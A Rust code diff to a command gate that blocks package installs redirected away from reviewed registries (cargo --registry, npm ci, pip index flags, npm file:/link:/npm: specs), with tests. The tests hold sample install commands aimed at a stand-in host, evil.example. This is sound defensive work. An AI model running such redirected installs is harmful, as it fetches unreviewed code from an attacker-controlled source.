@@ -645,6 +645,10 @@ fn non_registry_spec(token: &str) -> bool {
         || token.starts_with("github:")
         || token.starts_with("gitlab:")
         || token.starts_with("bitbucket:")
+        || token.starts_with("file:")
+        || token.starts_with("link:")
+        || token.starts_with("npm:")
+        || token.starts_with("workspace:")
         || token.starts_with("./")
         || token.starts_with("../")
         || token.starts_with('/')
@@ -850,13 +854,32 @@ fn npm_registry_override_shape(line: &str) -> Vec<String> {
             )
         })
     });
+    let mut denies = Vec::new();
+    // `cargo install --registry <url>` points the install at an alternative
+    // registry or a local path, so the reviewed crates.io bytes are not the
+    // bytes cargo fetches. Asked once per line, and ahead of the npm-family
+    // guard below, which returns early for a command with no npm manager
+    // anywhere in it: a check that also ran after that return recorded the
+    // same reason twice for a command carrying both a cargo and an npm token.
+    if words
+        .iter()
+        .any(|w| matches!(manager_from_token(w), Some(RefManager::Cargo)))
+        && words.iter().any(|w| matches!(*w, "install" | "i" | "add"))
+        && words
+            .iter()
+            .any(|w| *w == "--registry" || w.starts_with("--registry=") || *w == "--index")
+    {
+        denies.push(
+            "cargo --registry override would review crates.io and install from another source"
+                .to_string(),
+        );
+    }
     if !has_manager {
-        return Vec::new();
+        return denies;
     }
     let has_npm_install = words
         .iter()
-        .any(|w| matches!(*w, "install" | "i" | "add" | "exec" | "x" | "dlx"));
-    let mut denies = Vec::new();
+        .any(|w| matches!(*w, "install" | "i" | "add" | "exec" | "x" | "dlx" | "ci"));
     // `npm config set registry ...` redirects every future install.
     if words.contains(&"config") && words.contains(&"set") {
         denies.push(
@@ -907,7 +930,11 @@ fn pip_non_registry_shape(line: &str) -> Option<String> {
                 in_install = true;
                 continue;
             }
-            if in_install && DANGEROUS.contains(word) {
+            if in_install
+                && DANGEROUS
+                    .iter()
+                    .any(|d| *word == *d || word.starts_with(&format!("{d}=")))
+            {
                 return Some(format!(
                     "pip {word} names or redirects non-registry sources"
                 ));
@@ -1525,6 +1552,88 @@ mod tests {
         assert!(gate_hard_denies("npm install y").is_empty());
         assert!(gate_hard_denies("cargo install foo").is_empty());
         assert!(gate_hard_denies("PIP_INDEX_URL=https://evil.example echo hi").is_empty());
+    }
+
+    /// One reason per distinct problem. The `cargo --registry` check ran on
+    /// both sides of the npm-family guard, and the guard returns early only
+    /// for a command with no npm manager in it — so a mixed command hit the
+    /// same check twice and reported one problem twice. A pure-cargo command
+    /// took the early return and emitted one copy, which is why a non-empty
+    /// assertion never caught it.
+    #[test]
+    fn a_mixed_npm_cargo_command_records_the_cargo_denial_once() {
+        let mixed = gate_hard_denies(
+            "npm install x && cargo install --registry=https://evil.example serde",
+        );
+        assert!(
+            mixed
+                .iter()
+                .filter(|d| d.contains("cargo --registry"))
+                .count()
+                == 1,
+            "the cargo denial must be recorded once: {mixed:?}"
+        );
+        assert_eq!(
+            mixed.len(),
+            2,
+            "exactly the npm override and the cargo override: {mixed:?}"
+        );
+
+        let pure = gate_hard_denies("cargo install --registry=https://evil.example serde");
+        assert_eq!(pure.len(), 1, "{pure:?}");
+        assert!(pure[0].contains("cargo --registry"), "{pure:?}");
+
+        // Two cargo redirect flags on one line are still one question asked
+        // of the line, so they stay one reason.
+        let both = gate_hard_denies(
+            "cargo install --registry=https://evil.example --index=https://other.example serde",
+        );
+        assert_eq!(both.len(), 1, "{both:?}");
+    }
+
+    #[test]
+    fn gate_covers_registry_redirects_it_previously_missed() {
+        // Each of these reviewed one registry while installing from another,
+        // and was allowed through because the shape check did not recognise
+        // the spelling.
+        for cmd in [
+            "pip install --index-url=https://evil.example requests",
+            "pip install --extra-index-url=https://evil.example requests",
+            "pip install --requirement=reqs.txt requests",
+            "pip install --constraint=pin.txt requests",
+            "npm ci --registry=https://evil.example",
+            "cargo install --registry=https://evil.example serde",
+        ] {
+            let denies = gate_hard_denies(cmd);
+            assert!(!denies.is_empty(), "`{cmd}` must be denied on shape");
+        }
+    }
+
+    #[test]
+    fn non_registry_specs_cover_every_npm_alias_scheme() {
+        // `file:`, `link:`, `npm:` and `workspace:` name a payload no registry
+        // vouches for. Missing from the list, they fell through the spec
+        // grammar, matched nothing, and the gate allowed the install.
+        for spec in [
+            "file:../evil",
+            "link:../evil",
+            "npm:evil@https://evil.example/x.tgz",
+            "workspace:*",
+            "../evil",
+            "/abs/evil",
+            "git+https://evil.example/x",
+        ] {
+            assert!(
+                non_registry_spec(spec),
+                "`{spec}` must count as a non-registry reference"
+            );
+        }
+        for spec in ["lodash", "express@4.21.2", "@scope/pkg", "1.2.3"] {
+            assert!(
+                !non_registry_spec(spec),
+                "`{spec}` must stay a registry spec"
+            );
+        }
     }
 
     #[test]
